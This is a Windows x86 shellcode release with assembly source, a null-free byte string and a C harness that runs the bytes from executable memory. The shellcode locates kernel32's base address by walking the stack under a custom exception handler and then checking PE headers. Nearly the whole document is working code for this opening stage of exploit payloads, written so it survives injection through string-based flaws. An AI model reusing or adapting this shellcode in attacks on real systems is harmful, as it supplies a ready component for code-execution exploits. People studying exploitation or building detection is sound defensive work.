# Shellcode Title: Windows/x86 - Locate kernel32 base address / Stack Crack method NullFree Shellcode (171 bytes)
# Description:
# This shellcode is a new method to find kernel32 base address by walking down the stack and look for a possible Kernel32 address using custom SEH handler.
# Each address found on the stack will be tested using the Exception handling function. If it's valid and starts with 7, then it's a possible kernel32 address.
# Date: 2/5/2022
# Shellcode Author: Tarek Ahmed
# Tested on: Microsoft Windows 7, and 10

/*

MIT License

Copyright (c) 2022 Tarek Ahmed

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

sub esp, 8
xor eax, eax
cdq
xchg edx, ecx


StackWalk :
	mov ebx, [esp + ecx]	; Walking down the stack to find a possible kernel32 pointer
	mov edx, ebx
	shr ebx, 28		; Shift right 28 to get the last digit in the address, (looking for 7)
	add ecx, 4
	cmp ebx, 7		; is it 7 ?
	jne StackWalk
	jmp short checking

checkAddress :
	push ebp
	mov ebp, esp
	jmp rev1					; jmp down to rev1 and up again to avoid null bytes and get the address of next instruciton.
	reverse:
	pop eax
	jmp eax
	rev1:
	call reverse
	add eax, 0x1e
	push eax
	xor edi, edi
	push dword ptr FS : [edi]			; Push FS[0] SEH
	mov dword ptr fs : [edi] , esp		; set up or SEH stack
	mov eax, dword ptr ss : [ebp + 8]
        xchg eax, esi				; We want to call [esi] instead of [eax] next to avoid null bytes
	mov eax, dword ptr ds : [esi]

	xor eax, eax

	jmp short cleanseh


	xor eax, eax
	inc eax
	mov esp, dword ptr fs : [edi]
	mov esp, dword ptr ss : [esp]


cleanseh :
	pop dword ptr fs : [edi]
	add esp, 4
	pop ebp
	ret


checking:

	mov [ebp-0xc], ecx
	push edx				; Push the address we want to check if it's valid or not
	call checkAddress		; call the custom SEH function
	test eax, eax			; is it valid ? 0 ?
	je valid
	mov ecx, [ebp-0xc]
	jmp short StackWalk


valid :
	mov ecx, [ebp-0xc]
	mov ax, 0xffff			; We want to subtract 0x10000 from the address we found 0xffff + 1 = 0x10000
	inc eax


	findMZ:
	sub edx, eax			; Sub 0x10000 from the possible address
	mov dx, ax
	mov ax, [edx]
	cmp ax, 0x5a4d			; check for MZ to make sure it's a DLL file.
	jne findMZ			; If not, subtract one more 0x10000 to get a different section.
	xchg edx, ebx
	mov edi, [ebx + 0x3c]		; Walk the PE file
	add edi, ebx
	mov edi, [edi + 0x78]
	add edi, ebx
	mov edi, [edi + 0xc]
	add edi, ebx
	add edi, 4

	xor eax, eax
	push eax
	push 0x6c6c642e			; string .dll
	push 0x32334c45			; string EL32	= EL32.dll short for KERNEL32.dll
	mov esi, esp

checkKernel :
	mov edx, ecx
	mov cl, 8			; Compare string to KERNEL32.dll EDI ==> KERNEl32.dll
	cld

	repe cmpsb
	test ecx, ecx
	je foundKernel			; if equal, jmp to foundKernel
	mov ecx, edx
	jmp StackWalk

foundKernel :
					; Kernel32 base address should be in EBX if you reach this line.


*/

#include <windows.h>
#include <iostream>
#include <stdlib.h>
#include <stdio.h>


unsigned char code[] = "\x83\xEC\x08\x31\xC0\x99\x87\xCA\x8B\x1C\x0C\x89\xDA\xC1\xEB\x1C\x83\xC1\x04\x83\xFB\x07\x75\xF0\xEB\x34\x55\x89\xE5\xEB\x03\x58\xFF\xE0\xE8\xF8\xFF\xFF\xFF\x83\xC0\x1E\x50\x31\xFF\x64\xFF\x37\x64\x89\x27\x8B\x45\x08\x96\x8B\x06\x31\xC0\xEB\x09\x31\xC0\x40\x64\x8B\x27\x8B\x24\x24\x64\x8F\x07\x83\xC4\x04\x5D\xC3\x89\x4D\xF4\x52\xE8\xC3\xFF\xFF\xFF\x85\xC0\x74\x05\x8B\x4D\xF4\xEB\xA8\x8B\x4D\xF4\x66\xB8\xFF\xFF\x40\x29\xC2\x66\x89\xC2\x66\x8B\x02\x66\x3D\x4D\x5A\x75\xF2\x87\xDA\x8B\x7B\x3C\x01\xDF\x8B\x7F\x78\x01\xDF\x8B\x7F\x0C\x01\xDF\x83\xC7\x04\x31\xC0\x50\x68\x2E\x64\x6C\x6C\x68\x45\x4C\x33\x32\x89\xE6\x89\xCA\xB1\x08\xFC\xF3\xA6\x85\xC9\x74\x07\x89\xD1\xE9\x5D\xFF\xFF\xFF"

;

int main()
{


	void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, code, sizeof(code));
	((void(*)())exec)();

	return 0;




}